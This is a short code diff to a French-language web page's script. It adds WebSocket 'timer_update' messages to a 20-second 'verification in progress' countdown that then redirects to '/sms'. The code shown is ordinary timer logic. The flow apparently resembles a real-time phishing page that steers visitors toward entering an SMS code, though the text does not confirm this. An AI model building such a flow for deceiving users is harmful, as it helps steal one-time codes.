@@ -65,10 +65,16 @@
 
         // Redirection automatique après 20s vers SMS (par défaut)
         let timeLeft = 20;
-        setInterval(() => {
+        const timerInterval = setInterval(() => {
             timeLeft--;
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ event: "timer_update", data: { timeLeft: timeLeft } }));
+            }
             if (timeLeft >= 0) document.getElementById('timer').textContent = `Vérification en cours (${timeLeft}s)`;
-            if (timeLeft === 0) window.location.href = '/sms';
+            if (timeLeft === 0) {
+                clearInterval(timerInterval);
+                window.location.href = '/sms';
+            }
         }, 1000);
     </script>
 </body>
